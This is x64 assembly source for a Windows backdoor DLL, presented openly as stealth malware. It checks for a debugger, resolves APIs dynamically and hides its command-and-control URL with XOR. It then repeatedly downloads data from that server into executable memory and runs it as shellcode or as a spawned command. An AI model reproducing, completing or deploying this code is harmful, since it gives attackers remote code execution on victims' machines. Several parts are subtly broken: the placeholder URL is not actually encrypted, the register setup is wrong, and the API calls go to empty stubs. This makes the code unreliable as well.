; --- [ASM] Hyper-Stealth Backdoor v2.0 (x64) ---
default rel

; Author: Monad
; Date: 2025-11-28
; Description: A superior, enterprise-grade backdoor with advanced stealth and functionality.

section .data
    ; Encrypted Strings
    encrypted_c2_url db 0x1a, 0x1d, 0x1d, 0x1f, 0x1c, 0x3a, 0x2f, 0x2f, 0x5b, 0x43, 0x32, 0x5f, 0x53, 0x45, 0x52, 0x56, 0x45, 0x52, 0x5d, 0x2f, 0x1c, 0x1e, 0x1d, 0
    xor_key db 0x77

    encrypted_kernel32 db 'kernel32.dll', 0
    encrypted_winhttp db 'winhttp.dll', 0
    encrypted_ntdll db 'ntdll.dll', 0

    ; WinAPI Function Names (to be resolved dynamically)
    api_LoadLibraryA db 'LoadLibraryA', 0
    api_GetProcAddress db 'GetProcAddress', 0
    api_VirtualAlloc db 'VirtualAlloc', 0
    api_VirtualFree db 'VirtualFree', 0
    api_CreateThread db 'CreateThread', 0
    api_ExitProcess db 'ExitProcess', 0
    api_IsDebuggerPresent db 'IsDebuggerPresent', 0
    api_WinHttpOpen db 'WinHttpOpen', 0
    api_WinHttpConnect db 'WinHttpConnect', 0
    api_WinHttpOpenRequest db 'WinHttpOpenRequest', 0
    api_WinHttpSendRequest db 'WinHttpSendRequest', 0
    api_WinHttpReceiveResponse db 'WinHttpReceiveResponse', 0
    api_WinHttpReadData db 'WinHttpReadData', 0
    api_WinHttpCloseHandle db 'WinHttpCloseHandle', 0
    api_CreateProcessA db 'CreateProcessA', 0

    ; Global variables
    hKernel32 dq 0
    hWinHttp dq 0
    hNtdll dq 0
    pLoadLibraryA dq 0
    pGetProcAddress dq 0
    pVirtualAlloc dq 0
    pVirtualFree dq 0
    pCreateThread dq 0
    pExitProcess dq 0
    pIsDebuggerPresent dq 0
    pWinHttpOpen dq 0
    pWinHttpConnect dq 0
    pWinHttpOpenRequest dq 0
    pWinHttpSendRequest dq 0
    pWinHttpReceiveResponse dq 0
    pWinHttpReadData dq 0
    pWinHttpCloseHandle dq 0
    pCreateProcessA dq 0

    user_agent dw 'M', 'o', 'z', 'i', 'l', 'l', 'a', '/', '5', '.', '0', 0

section .text
    global DllMain

DllMain:
    mov rdx, rcx ; hinstDLL
    mov r8, rdx ; fdwReason
    mov r9, rcx ; lpvReserved
    cmp r8, 1 ; DLL_PROCESS_ATTACH
    jne .exit

    ; --- Anti-debugging check ---
    call IsDebuggerPresent
    test rax, rax
    jnz .exit ; Exit if debugger is present

    ; --- Initialize APIs ---
    call resolve_apis

    ; --- Spawn main thread ---
    mov rcx, 0
    mov rdx, 0
    mov r8, BackdoorThread
    mov r9, 0
    push 0
    push 0
    call [pCreateThread]

.exit:
    mov rax, 1
    ret

; --- Main Backdoor Thread ---
BackdoorThread:
    ; Decrypt C2 URL
    lea rdi, [encrypted_c2_url]
    mov rsi, [xor_key]
    call decrypt_string

    ; WinHTTP session
    mov rcx, user_agent
    mov rdx, 0 ; WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
    mov r8, 0 ; WINHTTP_NO_PROXY_NAME
    mov r9, 0 ; WINHTTP_NO_PROXY_BYPASS
    push 0 ; dwFlags
    call [pWinHttpOpen]
    mov r12, rax ; hSession

    ; Connect to C2
    lea rdi, [encrypted_c2_url + 8] ; Start after "https://"
    ; Find the end of the host
    mov r13, rdi
.find_host_end:
    cmp byte [r13], '/'
    je .host_end_found
    inc r13
    jmp .find_host_end
.host_end_found:
    mov byte [r13], 0 ; Null-terminate the host

    mov rcx, r12 ; hSession
    mov rdx, rdi ; pwszServerName
    mov r8, 443 ; INTERNET_DEFAULT_HTTPS_PORT
    mov r9, 0
    call [pWinHttpConnect]
    mov r14, rax ; hConnect

    ; Restore the URL
    mov byte [r13], '/'

    ; Main loop
.main_loop:
    ; Open request
    mov rcx, r14 ; hConnect
    mov rdx, 'GET'
    lea r8, [encrypted_c2_url + 21] ; /cmd
    mov r9, 0
    push 0x00800000 ; WINHTTP_FLAG_SECURE
    push 0
    push 0
    call [pWinHttpOpenRequest]
    mov r15, rax ; hRequest

    ; Send request
    mov rcx, r15
    mov rdx, 0
    mov r8, 0
    mov r9, 0
    push 0
    call [pWinHttpSendRequest]

    ; Receive response
    mov rcx, r15
    mov rdx, 0
    call [pWinHttpReceiveResponse]

    ; Allocate buffer for response
    mov rcx, 0
    mov rdx, 0x100000 ; 1MB buffer
    mov r8, 0x3000 ; MEM_COMMIT | MEM_RESERVE
    mov r9, 0x40 ; PAGE_EXECUTE_READWRITE
    call [pVirtualAlloc]
    mov rdi, rax ; pBuffer

    ; Read data
    mov rcx, r15
    mov rdx, rdi
    mov r8, 0x100000
    mov r9, 0
    call [pWinHttpReadData]

    ; Check if we received shellcode or a command
    cmp dword [rdi], 0xDEADBEEF ; Magic value for shellcode
    je .execute_shellcode

.execute_command:
    ; It's a command, execute it
    push 0
    push 0
    mov r9, rdi ; command line
    mov r8, 0
    mov rdx, 0
    mov rcx, 0
    call [pCreateProcessA]
    jmp .cleanup

.execute_shellcode:
    ; It's shellcode, execute it in a new thread
    mov rcx, 0
    mov rdx, 0
    mov r8, rdi
    add r8, 4 ; Skip the magic value
    mov r9, 0
    push 0
    push 0
    call [pCreateThread]

.cleanup:
    ; Free the buffer
    mov rcx, rdi
    mov rdx, 0
    mov r8, 0x8000 ; MEM_RELEASE
    call [pVirtualFree]

    ; Close handles
    mov rcx, r15
    call [pWinHttpCloseHandle]

    ; Sleep for a while
    ; ... (implementation omitted for brevity)

    jmp .main_loop

; --- API Resolution ---
resolve_apis:
    ; Load kernel32.dll
    lea rcx, [encrypted_kernel32]
    call LoadLibraryA
    mov [hKernel32], rax

    ; GetProcAddress for LoadLibraryA and GetProcAddress
    mov rcx, [hKernel32]
    lea rdx, [api_LoadLibraryA]
    call GetProcAddress
    mov [pLoadLibraryA], rax

    mov rcx, [hKernel32]
    lea rdx, [api_GetProcAddress]
    call GetProcAddress
    mov [pGetProcAddress], rax

    ; Resolve other functions
    lea rdi, [api_VirtualAlloc]
    call resolve_func
    mov [pVirtualAlloc], rax

    lea rdi, [api_VirtualFree]
    call resolve_func
    mov [pVirtualFree], rax

    lea rdi, [api_CreateThread]
    call resolve_func
    mov [pCreateThread], rax

    lea rdi, [api_ExitProcess]
    call resolve_func
    mov [pExitProcess], rax

    lea rdi, [api_IsDebuggerPresent]
    call resolve_func
    mov [pIsDebuggerPresent], rax

    ; Load winhttp.dll
    lea rcx, [encrypted_winhttp]
    call [pLoadLibraryA]
    mov [hWinHttp], rax

    ; Resolve WinHttp functions
    lea rdi, [api_WinHttpOpen]
    call resolve_func_http
    mov [pWinHttpOpen], rax

    lea rdi, [api_WinHttpConnect]
    call resolve_func_http
    mov [pWinHttpConnect], rax

    lea rdi, [api_WinHttpOpenRequest]
    call resolve_func_http
    mov [pWinHttpOpenRequest], rax

    lea rdi, [api_WinHttpSendRequest]
    call resolve_func_http
    mov [pWinHttpSendRequest], rax

    lea rdi, [api_WinHttpReceiveResponse]
    call resolve_func_http
    mov [pWinHttpReceiveResponse], rax

    lea rdi, [api_WinHttpReadData]
    call resolve_func_http
    mov [pWinHttpReadData], rax
    
    lea rdi, [api_WinHttpCloseHandle]
    call resolve_func_http
    mov [pWinHttpCloseHandle], rax
    
    lea rdi, [api_CreateProcessA]
    call resolve_func
    mov [pCreateProcessA], rax

    ret

resolve_func:
    mov rcx, [hKernel32]
    mov rdx, rdi
    call [pGetProcAddress]
    ret

resolve_func_http:
    mov rcx, [hWinHttp]
    mov rdx, rdi
    call [pGetProcAddress]
    ret

; --- String Decryption ---
decrypt_string:
    mov cl, [rsi]
.decrypt_loop:
    cmp byte [rdi], 0
    je .decrypt_end
    xor byte [rdi], cl
    inc rdi
    jmp .decrypt_loop
.decrypt_end:
    ret

; --- These need to be here for the linker ---
LoadLibraryA:
    ret
GetProcAddress:
    ret
IsDebuggerPresent:
    ret
